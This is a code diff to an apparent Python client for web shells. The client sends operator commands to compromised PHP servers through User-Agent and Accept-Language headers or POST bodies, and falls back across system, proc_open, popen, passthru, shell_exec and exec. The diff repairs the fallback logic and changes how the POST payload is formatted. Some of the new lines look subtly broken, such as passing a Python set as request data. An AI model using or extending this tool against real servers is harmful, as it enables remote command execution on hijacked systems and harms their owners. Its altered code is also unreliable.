@@ -34,7 +34,6 @@ yellow = "\033[33m"
 # Functions
 
 
-
 async def http_request(client, method, url, headers=None, data=None):
     headers = headers or {}
     try:
@@ -77,7 +76,6 @@ async def http_accept_language_get(client, url, cmd):
 
 async def http_user_agent_post(client, url, data, cmd):
     headers = create_headers(cmd)
-    print(data)
     return await http_request(client, 'post', url, headers, data)
 
 async def http_accept_language_post(client, url, data, cmd):
@@ -110,7 +108,7 @@ async def execute(client, url, cmd, type):
             return r
 
         case "post":
-            r = await http_request(client, 'post', url, data=cmd)
+            r = await http_request(client, 'post', url, data={cmd})
             if not r:
                 result = red + 'ERROR' + clear + '\n'
             return r
@@ -121,13 +119,13 @@ async def execute(client, url, cmd, type):
                 result = await http_user_agent_get(client, url + '?cmd=proc_open', cmd)
             elif not result:
                 result = await http_user_agent_get(client, url + '?cmd=popen', cmd)
-            elif not result:
+            if not result:
                 result = await http_user_agent_get(client, url + '?cmd=passthru', cmd)
-            elif not result:
+            if not result:
                 result = await http_user_agent_get(client, url + '?cmd=shell_exec', cmd)
-            elif not result:
+            if not result:
                 result = await http_user_agent_get(client, url + '?cmd=exec', cmd)
-            elif not result:
+            if not result:
                 result = red + 'ERROR' + clear + '\n'
             return result
 
@@ -135,47 +133,47 @@ async def execute(client, url, cmd, type):
             result = await http_accept_language_get(client, url + '?cmd=system', cmd)
             if not result:
                 result = await http_accept_language_get(client, url + '?cmd=proc_open', cmd)
-            elif not result:
+            if not result:
                 result = await http_accept_language_get(client, url + '?cmd=popen', cmd)
-            elif not result:
+            if not result:
                 result = await http_accept_language_get(client, url + '?cmd=passthru', cmd)
-            elif not result:
+            if not result:
                 result = await http_accept_language_get(client, url + '?cmd=shell_exec', cmd)
-            elif not result:
+            if not result:
                 result = await http_accept_language_get(client, url + '?cmd=exec', cmd)
-            elif not result:
+            if not result:
                 result = red + 'ERROR' + clear + '\n'
             return result
 
         case "http_user_agent_post":
-            result = await http_user_agent_post(client, url, 'cmd=system', cmd)
+            result = await http_user_agent_post(client, url, "'cmd':'system'", cmd)
             if not result:
-                result = await http_user_agent_post(client, url, 'cmd=proc_open', cmd)
-            elif not result:
-                result = await http_user_agent_post(client, url, 'cmd=popen', cmd)
-            elif not result:
-                result = await http_user_agent_post(client, url, 'cmd=passthru', cmd)
-            elif not result:
-                result = await http_user_agent_post(client, url, 'cmd=shell_exec', cmd)
-            elif not result:
-                result = await http_user_agent_post(client, url, 'cmd=exec', cmd)
-            elif not result:
+                result = await http_user_agent_post(client, url,  "'cmd':'proc_open'", cmd)
+            if not result:
+                result = await http_user_agent_post(client, url,  "'cmd':'popen'", cmd)
+            if not result:
+                result = await http_user_agent_post(client, url,  "'cmd':'passthru'", cmd)
+            if not result:
+                result = await http_user_agent_post(client, url,  "'cmd':'shell_exec'", cmd)
+            if not result:
+                result = await http_user_agent_post(client, url,  "'cmd':'exec'", cmd)
+            if not result:
                 result = red + 'ERROR' + clear + '\n'
             return result
 
         case "http_accept_language_post":
-            result = await http_accept_language_post(client, url, 'cmd=system', cmd)
+            result = await http_accept_language_post(client, url,  "'cmd':'system'", cmd)
             if not result:
-                result = await http_accept_language_post(client, url, 'cmd=proc_open', cmd)
-            elif not result:
-                result = await http_accept_language_post(client, url, 'cmd=popen', cmd)
-            elif not result:
-                result = await http_accept_language_post(client, url, 'cmd=passthru', cmd)
-            elif not result:
-                result = await http_accept_language_post(client, url, 'cmd=shell_exec', cmd)
-            elif not result:
-                result = await http_accept_language_post(client, url, 'cmd=exec', cmd)
-            elif not result:
+                result = await http_accept_language_post(client, url,  "'cmd':'proc_open'", cmd)
+            if not result:
+                result = await http_accept_language_post(client, url,  "'cmd':'popen'", cmd)
+            if not result:
+                result = await http_accept_language_post(client, url,  "'cmd':'passthru'", cmd)
+            if not result:
+                result = await http_accept_language_post(client, url,  "'cmd':'shell_exec'", cmd)
+            if not result:
+                result = await http_accept_language_post(client, url,  "'cmd':'exec'", cmd)
+            if not result:
                 result = red + 'ERROR' + clear + '\n'
             return result
 
@@ -183,11 +181,11 @@ async def execute(client, url, cmd, type):
             result = await http_aizawa_ninja(client, url, 'system~' + cmd)
             if not result:
                 result = await http_aizawa_ninja(client, url, 'passthru~' + cmd)
-            elif not result:
+            if not result:
                 result = await http_aizawa_ninja(client, url, 'shell_exec~' + cmd)
-            elif not result:
+            if not result:
                 result = await http_aizawa_ninja(client, url, 'exec~' + cmd)
-            elif not result:
+            if not result:
                 result = red + 'ERROR' + clear + '\n'
             return result
 
